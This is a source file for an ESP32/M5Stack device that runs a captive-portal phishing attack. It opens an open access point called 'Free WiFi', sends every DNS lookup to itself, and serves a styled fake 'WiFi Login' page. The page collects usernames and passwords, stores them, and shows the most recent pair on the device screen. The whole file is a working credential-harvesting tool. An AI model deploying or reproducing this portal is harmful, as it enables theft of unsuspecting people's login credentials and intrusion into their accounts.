#include "sys_core.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Globals
DNSServer dnsServer;
WebServer server(80);
const IPAddress apIP(192, 168, 4, 1);

const char html_head[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <title>WiFi Login</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .box {
      background: white;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px 30px;
      max-width: 400px;
      width: 100%;
      animation: slideIn 0.3s ease;
    }
    @keyframes slideIn {
      from { transform: translateY(-20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    .logo {
      width: 60px;
      height: 60px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 30px;
    }
    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 10px;
    }
    p {
      text-align: center;
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 16px;
      transition: border 0.3s;
    }
    input:focus {
      outline: none;
      border-color: #667eea;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s;
    }
    button:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>
  <div class='box'>
    <div class='logo'>📶</div>
    <h2>Free WiFi</h2>
    <p>Sign in to continue</p>
    <form action='/login' method='POST'>
      <input type='text' name='user' placeholder='Email or Username' required>
      <input type='password' name='pass' placeholder='Password' required>
      <button type='submit'>Connect</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

void portal_loop() {
  hardResetRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free WiFi", nullptr);

  dnsServer.start(53, "*", apIP);

  server.on("/", []() {
    server.send(200, "text/html", html_head);
  });
  
  server.on("/login", []() {
    if (portal_log_count < 5) {
       // FIX: Assign fields individually
       portal_logs[portal_log_count].user = server.arg("user");
       portal_logs[portal_log_count].pass = server.arg("pass");
       portal_log_count++;
    }
    server.send(200, "text/html", "<h1>Done</h1>");
  });
  
  server.onNotFound([]() { server.send(200, "text/html", html_head); });
  server.begin();

  M5Canvas s(&M5.Display);
  s.createSprite(240, 135);

  while (true) {
    dnsServer.processNextRequest();
    server.handleClient();
    M5.update();

    s.fillScreen(BLACK);
    s.setTextColor(RED, BLACK);
    s.drawCenterString("PORTAL ACTIVE", 120, 10);
    s.setTextColor(WHITE, BLACK);
    s.setCursor(10, 40);
    s.printf("Logs: %d", portal_log_count);

    // Show last log
    if (portal_log_count > 0) {
        s.setTextColor(GREEN, BLACK);
        s.setCursor(10, 70);
        s.println(portal_logs[portal_log_count-1].user);
        s.println(portal_logs[portal_log_count-1].pass);
    }
    
    if (checkExit()) break;
    s.pushSprite(0, 0);
  }
  dnsServer.stop();
  server.stop();
  hardResetRadios();
  s.deleteSprite();
}